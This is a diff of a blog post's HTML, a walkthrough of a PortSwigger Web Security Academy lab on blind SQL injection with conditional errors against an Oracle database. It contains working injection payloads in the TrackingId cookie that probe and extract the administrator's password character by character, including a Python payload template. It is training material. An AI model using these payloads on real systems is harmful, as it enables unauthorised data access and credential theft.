@@ -1,47 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<!-- 2026-03-29 Sun 21:03 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>WSA: Blind SQL Injection with conditional errors</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="description" content="Walkthrough for the related PortSwigger Web Lab." />
 <meta name="generator" content="Org Mode" />
-<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
 <div id="preamble" class="status">
 <nav class="site-nav"> <div class="nav-header"> <a href="/" class="logo" aria-label="Home"> <span class="site-title">Chasing Simplicity</span> </a> <button id="menu-toggle" aria-label="Toggle menu"> <span class="hamburger"></span> </button> </div> <ul id="nav-menu"> <li><a href="/posts/recents.html" class="active">archive</a></li> <li><a href="/tags/index.html">tags</a></li> <li><a href="/posts/books.html">reading list</a></li> <li><a href="/posts/about.html">about</a></li> <li class="search-item"> <div id="search"></div> </li> <li class="theme-item"> <button id="theme-toggle" aria-label="Toggle theme">dark mode</button> </li> </ul> </nav>
 </div>
 <div id="content" class="content">
+<header>
 <h1 class="title">WSA: Blind SQL Injection with conditional errors</h1>
-<div id="table-of-contents" role="doc-toc">
+<nav class="post-tags">
+<span>Tags:</span> <a href="/tags/wsa.html" class="tag">wsa</a> <a href="/tags/sqli.html" class="tag">sqli</a>
+</nav></header><nav id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org56dead8">Introduction</a></li>
-<li><a href="#orgc26b389">Web Security Academy</a></li>
-<li><a href="#org29b72a3">The process</a>
+<li><a href="#org1ddf41d">Introduction</a></li>
+<li><a href="#orgc05030a">Web Security Academy</a></li>
+<li><a href="#org8254ada">The process</a>
 <ul>
-<li><a href="#org1994c32">Finding the SQLi point</a></li>
-<li><a href="#orge071ca7">Finding the SQL backend</a></li>
-<li><a href="#orgeb84efb">Developing a base condition</a></li>
-<li><a href="#org30a3a0b">Validating the existence of specifics</a></li>
-<li><a href="#org8bed8b7">Getting info about password</a>
+<li><a href="#orgf389dd1">Finding the SQLi point</a></li>
+<li><a href="#org3087db5">Finding the SQL backend</a></li>
+<li><a href="#orgff19ce7">Developing a base condition</a></li>
+<li><a href="#org153100f">Validating the existence of specifics</a></li>
+<li><a href="#org8690b59">Getting info about password</a>
 <ul>
-<li><a href="#org82316fd">Password Length</a></li>
-<li><a href="#orgf0518f4">Password Contents</a></li>
+<li><a href="#org577e9b8">Password Length</a></li>
+<li><a href="#org8fe11b4">Password Contents</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org2bb36b3">Summary</a></li>
+<li><a href="#orgfa31d1f">Summary</a></li>
 </ul>
 </div>
-</div>
-<div id="outline-container-org56dead8" class="outline-2">
-<h2 id="org56dead8"><a href="#org56dead8">Introduction</a></h2>
-<div class="outline-text-2" id="text-org56dead8">
+</nav>
+<div id="outline-container-org1ddf41d" class="outline-2">
+<h2 id="org1ddf41d"><a href="#org1ddf41d">Introduction</a></h2>
+<div class="outline-text-2" id="text-org1ddf41d">
 <p>
 I feel like much of the process I made during the last year, even
 though significant was disorganized and chaotic. I have reached a
@@ -59,9 +63,9 @@ Starting with SQL injections.
 </p>
 </div>
 </div>
-<div id="outline-container-orgc26b389" class="outline-2">
-<h2 id="orgc26b389"><a href="#orgc26b389">Web Security Academy</a></h2>
-<div class="outline-text-2" id="text-orgc26b389">
+<div id="outline-container-orgc05030a" class="outline-2">
+<h2 id="orgc05030a"><a href="#orgc05030a">Web Security Academy</a></h2>
+<div class="outline-text-2" id="text-orgc05030a">
 <p>
 <a href="https://portswigger.net/web-security/dashboard">Web Security Academy</a> has been a very interesting integration to my
 <i>studying</i> routine, allowing for easily deployable labs, directly from
@@ -76,16 +80,16 @@ the ones available in the website) by the end of May.
 </p>
 </div>
 </div>
-<div id="outline-container-org29b72a3" class="outline-2">
-<h2 id="org29b72a3"><a href="#org29b72a3">The process</a></h2>
-<div class="outline-text-2" id="text-org29b72a3">
+<div id="outline-container-org8254ada" class="outline-2">
+<h2 id="org8254ada"><a href="#org8254ada">The process</a></h2>
+<div class="outline-text-2" id="text-org8254ada">
 <p>
 &rsquo;nough said, let&rsquo;s dive into the lab. 
 </p>
 </div>
-<div id="outline-container-org1994c32" class="outline-3">
-<h3 id="org1994c32"><a href="#org1994c32">Finding the SQLi point</a></h3>
-<div class="outline-text-3" id="text-org1994c32">
+<div id="outline-container-orgf389dd1" class="outline-3">
+<h3 id="orgf389dd1"><a href="#orgf389dd1">Finding the SQLi point</a></h3>
+<div class="outline-text-3" id="text-orgf389dd1">
 <p>
 Knowing that this is a lab with a SQLi vulnerability, I just loaded
 the page on my browser, revealing a familiar page from previously
@@ -101,16 +105,16 @@ look at.</li>
 </ul>
 
 
-<div id="org393c7b9" class="figure">
-<p><img src="images/20240213_112605_screenshot.png" alt="20240213_112605_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 1: </span>SQLi POC</p>
+<figure id="org94b4730">
+<img src="images/20240213_112605_screenshot.png" alt="20240213_112605_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>SQLi POC</figcaption>
+</figure>
 </div>
 </div>
-</div>
-<div id="outline-container-orge071ca7" class="outline-3">
-<h3 id="orge071ca7"><a href="#orge071ca7">Finding the SQL backend</a></h3>
-<div class="outline-text-3" id="text-orge071ca7">
+<div id="outline-container-org3087db5" class="outline-3">
+<h3 id="org3087db5"><a href="#org3087db5">Finding the SQL backend</a></h3>
+<div class="outline-text-3" id="text-org3087db5">
 <p>
 Now, knowing that we have to manipulate the value of <code>TrackingID</code>
 cookie, we need to gather some more information about the underlying
@@ -137,16 +141,16 @@ that we are facing Oracle DBMS</li>
 
 
 
-<div id="orgf7316b5" class="figure">
-<p><img src="images/20240213_112905_screenshot.png" alt="20240213_112905_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 2: </span>Oracle DBMS poc</p>
+<figure id="org729a643">
+<img src="images/20240213_112905_screenshot.png" alt="20240213_112905_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 2: </span>Oracle DBMS poc</figcaption>
+</figure>
 </div>
 </div>
-</div>
-<div id="outline-container-orgeb84efb" class="outline-3">
-<h3 id="orgeb84efb"><a href="#orgeb84efb">Developing a base condition</a></h3>
-<div class="outline-text-3" id="text-orgeb84efb">
+<div id="outline-container-orgff19ce7" class="outline-3">
+<h3 id="orgff19ce7"><a href="#orgff19ce7">Developing a base condition</a></h3>
+<div class="outline-text-3" id="text-orgff19ce7">
 <p>
 Getting into our arsenal (<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQLi Cheatsheet</a>), we insert a <code>CASE</code>
 statement, and a division by zero to throw an exception when the
@@ -160,16 +164,16 @@ effectively translates into:
 </ul>
 
 
-<div id="orga7e1f9a" class="figure">
-<p><img src="images/20240213_113037_screenshot.png" alt="20240213_113037_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 3: </span>Getting the DBMS to throw an error</p>
+<figure id="org2148393">
+<img src="images/20240213_113037_screenshot.png" alt="20240213_113037_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 3: </span>Getting the DBMS to throw an error</figcaption>
+</figure>
 </div>
 </div>
-</div>
-<div id="outline-container-org30a3a0b" class="outline-3">
-<h3 id="org30a3a0b"><a href="#org30a3a0b">Validating the existence of specifics</a></h3>
-<div class="outline-text-3" id="text-org30a3a0b">
+<div id="outline-container-org153100f" class="outline-3">
+<h3 id="org153100f"><a href="#org153100f">Validating the existence of specifics</a></h3>
+<div class="outline-text-3" id="text-org153100f">
 <p>
 Our goal is to get the password of the <code>administrator</code> account but first
 we need to verify some data:
@@ -183,25 +187,25 @@ we need to verify some data:
 <p>
 These were mostly completed as shown here:
 </p>
-<pre class="example" id="org892676a">
+<pre class="example" id="org1ddb48f">
 TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE null END FROM users--
 TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE password END FROM users--
 TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE password END FROM users WHERE username='administrator'--
 </pre>
 </div>
 </div>
-<div id="outline-container-org8bed8b7" class="outline-3">
-<h3 id="org8bed8b7"><a href="#org8bed8b7">Getting info about password</a></h3>
-<div class="outline-text-3" id="text-org8bed8b7">
+<div id="outline-container-org8690b59" class="outline-3">
+<h3 id="org8690b59"><a href="#org8690b59">Getting info about password</a></h3>
+<div class="outline-text-3" id="text-org8690b59">
 <p>
 Pay attention to how my payload has slightly changed from the previous
 &ldquo;examples&rdquo;, and <b>special emphasis</b> should be given to the <code>from dual</code>
 part, since forgetting it causes 500 (oracle DBMS).
 </p>
 </div>
-<div id="outline-container-org82316fd" class="outline-4">
-<h4 id="org82316fd"><a href="#org82316fd">Password Length</a></h4>
-<div class="outline-text-4" id="text-org82316fd">
+<div id="outline-container-org577e9b8" class="outline-4">
+<h4 id="org577e9b8"><a href="#org577e9b8">Password Length</a></h4>
+<div class="outline-text-4" id="text-org577e9b8">
 <p>
 To get the length of the password field for the entry with
 <code>username='administrator'</code>, we can rely on the builtin function <code>LENGTH</code>
@@ -210,27 +214,27 @@ challenge at least) length of 100, we got that password length for
 administrator is 20 characters:
 </p>
 
-<pre class="example" id="org9310230">
+<pre class="example" id="orgc248fd4">
 TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT 'a' from users where username='administrator' and LENGTH(password)&gt;0)='a') THEN 'a' ELSE TO_CHAR(1/0) END from dual--
 Cookie: TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT 'a' from users where username='administrator' and LENGTH(password)&lt;100)='a') THEN 'a' ELSE TO_CHAR(1/0) END from dual--;
 </pre>
 
 
 
-<div id="orgb83cea7" class="figure">
-<p><img src="images/20240213_114312_screenshot.png" alt="20240213_114312_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 4: </span>Password Length Query</p>
-</div>
+<figure id="org589a2fb">
+<img src="images/20240213_114312_screenshot.png" alt="20240213_114312_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 4: </span>Password Length Query</figcaption>
+</figure>
 
 <p>
 This means that we need to get 20 characters
 </p>
 </div>
 </div>
-<div id="outline-container-orgf0518f4" class="outline-4">
-<h4 id="orgf0518f4"><a href="#orgf0518f4">Password Contents</a></h4>
-<div class="outline-text-4" id="text-orgf0518f4">
+<div id="outline-container-org8fe11b4" class="outline-4">
+<h4 id="org8fe11b4"><a href="#org8fe11b4">Password Contents</a></h4>
+<div class="outline-text-4" id="text-org8fe11b4">
 <p>
 Since I use Burp Community Edition I know that to get the password
 will take a fair share of my lifetime, should I stick with the
@@ -256,7 +260,7 @@ allowing through the usage of <code>proxies</code>, to have the requests sent to
 burp as well<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, while its payload is in the form of:
 </p>
 
-<pre class="example" id="org3768567">
+<pre class="example" id="orgc3cd114">
 'Cookie': f"TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT SUBSTR(password,{index},1) from users where username='administrator') ='{letter}') THEN TO_CHAR(1/0) ELSE null END from dual--; session=ImL77SPyy3Ne4HwEqb2Bnu2HFhIR18Vp",
 </pre>
 
@@ -274,18 +278,18 @@ This beautifully automates the process allowing me to get a:
 </p>
 
 
-<div id="org1916d68" class="figure">
-<p><img src="images/20240213_115634_screenshot.png" alt="20240213_115634_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 5: </span>BEAUTIFULLLLLLL</p>
+<figure id="org142cb23">
+<img src="images/20240213_115634_screenshot.png" alt="20240213_115634_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 5: </span>BEAUTIFULLLLLLL</figcaption>
+</figure>
 </div>
 </div>
 </div>
 </div>
-</div>
-<div id="outline-container-org2bb36b3" class="outline-2">
-<h2 id="org2bb36b3"><a href="#org2bb36b3">Summary</a></h2>
-<div class="outline-text-2" id="text-org2bb36b3">
+<div id="outline-container-orgfa31d1f" class="outline-2">
+<h2 id="orgfa31d1f"><a href="#orgfa31d1f">Summary</a></h2>
+<div class="outline-text-2" id="text-orgfa31d1f">
 <p>
 Do not make the mistake of overlooking these labs. They have been
 really fun to play with, and I feel like I have already learned so
